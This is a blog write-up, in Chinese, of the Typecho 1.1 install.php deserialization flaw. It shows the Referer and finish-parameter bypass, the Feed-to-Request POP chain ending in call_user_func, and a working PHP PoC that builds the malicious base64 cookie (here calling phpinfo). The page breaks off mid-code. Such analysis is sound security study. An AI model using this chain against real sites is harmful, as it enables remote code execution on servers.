<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>typecho1.1反序列化漏洞分析 - LionTree</title>
  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=反序列化,漏洞分析>
  
  
  
    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">LionTree</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/summary" class="menu-item-link">Summary</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
        <li class="menu-item">
          <a href="/atom.xml" class="menu-item-link">RSS</a>
        </li>
      
    </ul>
  </nav>
</header>

<article class="post">
  <div class="post-title">
    <h1 class="article-title">typecho1.1反序列化漏洞分析</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化触发点"><span class="toc-text">反序列化触发点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化利用链"><span class="toc-text">反序列化利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构造poc"><span class="toc-text">构造poc</span></a></li></ol>

  <div class="post-content">
    <h2 id="反序列化触发点"><a href="#反序列化触发点" class="headerlink" title="反序列化触发点"></a>反序列化触发点</h2><ul>
<li>在install.php 中存在用户可控的反序列化<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line">$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line">$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">Typecho_Db::set($db);</span><br></pre></td></tr></table></figure></li>
<li>前面有几个判断需要绕过才能到达反序列化的位置<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断是否已经安装</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挡掉可能的跨站请求</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</span><br><span class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol>
<li>第一个if传入?finish=123 即可</li>
<li>第二个if加入referer即可<blockquote>
<p>Referer: <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a></p>
</blockquote>
</li>
</ol>
<h2 id="反序列化利用链"><a href="#反序列化利用链" class="headerlink" title="反序列化利用链"></a>反序列化利用链</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line">$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line">$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">Typecho_Db::set($db);</span><br></pre></td></tr></table></figure>
<ul>
<li>最直接的想法是直接利用<strong>destruct或者</strong>wakeup，但是typecho并没有可以利用这两个魔术方法的地方</li>
<li>第二种想法就是利用unserialize的返回值，也就是$config</li>
</ul>
<p>这里<code>$config[&#39;adapter&#39;]</code>和<code>$config[&#39;prefix&#39;]</code>被传入了<code>Typecho_Db类</code>的构造函数__construct中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化适配器对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>$adapterName</code>和<code>$prefix</code> 都是用户可控的</li>
<li><code>$adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;</code><br>如果$adapterName 是一个对象的话，会触发<code>__toString</code></li>
</ul>
<p>全局搜索可以找到3个<code>__toString</code>:</p>
<ol>
<li><p>Typecho_Db_Query类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">           <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">           <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">               <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">               . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">               . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">               . <span class="string">' VALUES '</span></span><br><span class="line">               . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">               . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">           <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">               <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">               . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">               . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">           <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">               $columns = <span class="keyword">array</span>();</span><br><span class="line">               <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                   <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                       $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">               . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">               . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">               . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里拼接了sql语句但是没有执行，用处不大</p>
</li>
<li><p>Typecho_Config类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;_currentConfig);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>serialize 会触发<code>__sleep</code>,不过typecho 中没有存在<code>__sleep</code>的类</p>
</li>
<li><p>Typecho_Feed类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = <span class="string">'&lt;?xml version="1.0" encoding="'</span> . <span class="keyword">$this</span>-&gt;_charset . <span class="string">'"?&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">self</span>::RSS1 == <span class="keyword">$this</span>-&gt;_type) &#123;</span><br><span class="line">            $result .= <span class="string">'&lt;rdf:RDF</span></span><br><span class="line"><span class="string">xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"</span></span><br><span class="line"><span class="string">xmlns="http://purl.org/rss/1.0/"</span></span><br><span class="line"><span class="string">xmlns:dc="http://purl.org/dc/elements/1.1/"&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line"></span><br><span class="line">            $content = <span class="string">''</span>;</span><br><span class="line">            $links = <span class="keyword">array</span>();</span><br><span class="line">            $lastUpdate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</span><br><span class="line">                $content .= <span class="string">'&lt;item rdf:about="'</span> . $item[<span class="string">'link'</span>] . <span class="string">'"&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;dc:date&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/dc:date&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;description&gt;'</span> . strip_tags($item[<span class="string">'content'</span>]) . <span class="string">'&lt;/description&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'suffix'</span>])) &#123;</span><br><span class="line">                    $content .= $item[<span class="string">'suffix'</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                $content .= <span class="string">'&lt;/item&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line"></span><br><span class="line">                $links[] = $item[<span class="string">'link'</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ($item[<span class="string">'date'</span>] &gt; $lastUpdate) &#123;</span><br><span class="line">                    $lastUpdate = $item[<span class="string">'date'</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $result .= <span class="string">'&lt;channel rdf:about="'</span> . <span class="keyword">$this</span>-&gt;_feedUrl . <span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_title) . <span class="string">'&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;link&gt;'</span> . <span class="keyword">$this</span>-&gt;_baseUrl . <span class="string">'&lt;/link&gt;</span></span><br><span class="line"><span class="string">&lt;description&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_subTitle) . <span class="string">'&lt;/description&gt;</span></span><br><span class="line"><span class="string">&lt;items&gt;</span></span><br><span class="line"><span class="string">&lt;rdf:Seq&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($links <span class="keyword">as</span> $link) &#123;</span><br><span class="line">                $result .= <span class="string">'&lt;rdf:li resource="'</span> . $link . <span class="string">'"/&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $result .= <span class="string">'&lt;/rdf:Seq&gt;</span></span><br><span class="line"><span class="string">&lt;/items&gt;</span></span><br><span class="line"><span class="string">&lt;/channel&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line"></span><br><span class="line">            $result .= $content . <span class="string">'&lt;/rdf:RDF&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">self</span>::RSS2 == <span class="keyword">$this</span>-&gt;_type) &#123;</span><br><span class="line">            $result .= <span class="string">'&lt;rss version="2.0"</span></span><br><span class="line"><span class="string">xmlns:content="http://purl.org/rss/1.0/modules/content/"</span></span><br><span class="line"><span class="string">xmlns:dc="http://purl.org/dc/elements/1.1/"</span></span><br><span class="line"><span class="string">xmlns:slash="http://purl.org/rss/1.0/modules/slash/"</span></span><br><span class="line"><span class="string">xmlns:atom="http://www.w3.org/2005/Atom"</span></span><br><span class="line"><span class="string">xmlns:wfw="http://wellformedweb.org/CommentAPI/"&gt;</span></span><br><span class="line"><span class="string">&lt;channel&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line"></span><br><span class="line">            $content = <span class="string">''</span>;</span><br><span class="line">            $lastUpdate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</span><br><span class="line">                $content .= <span class="string">'&lt;item&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;guid&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/guid&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;pubDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/pubDate&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                $content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>一个很长的方法，其中<br><code>$content .= &#39;&lt;dc:creator&gt;&#39; . htmlspecialchars($item[&#39;author&#39;]-&gt;screenName) . &#39;&lt;/dc:creator&gt;&#39; . self::EOL;</code><br>如果<code>$item[&#39;author&#39;]</code>是一个类并且不存在screenName属性的话，会触发其<code>__get</code>方法</li>
</ul>
<p><code>__get</code>方法还挺多的,能够利用的是Typecho_Request类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">                $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">                $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $value = $default;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>$key</code>会被传给<code>get</code>方法,<code>get</code>方法给<code>$value</code>赋值后将其传给<code>_applyFilter</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">                $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">                call_user_func($filter, $value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的<code>array_map</code>和<code>call_user_func</code>都可以利用,只需要将<code>$filter</code>设为想要执行的函数，<code>$value</code>设为函数的参数即可</li>
</ul>
<h2 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h2><ul>
<li>一开始写的poc<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="string">'123'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'phpinfo'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>][<span class="string">'author'</span>] = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$config[<span class="string">'adapter'</span>] = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($config));</span><br></pre></td></tr></table></figure>
结果返回了http 500</li>
</ul>
<p>这是因为install.php在一开始调用了ob_start()开启了缓冲区，反序列化pop链执行后<code>phpinfo()</code>的内容没有立刻输出，而是先存在缓冲区里。</p>
<p>之后在<code>Typecho_Db</code>类的<code>__construct</code>中会抛出错误</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>之后会调用/var/Typecho/Common.php的<code>exceptionHandle</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exceptionHandle</span><span class="params">(Exception $exception)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       @ob_end_clean();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (defined(<span class="string">'__TYPECHO_DEBUG__'</span>)) 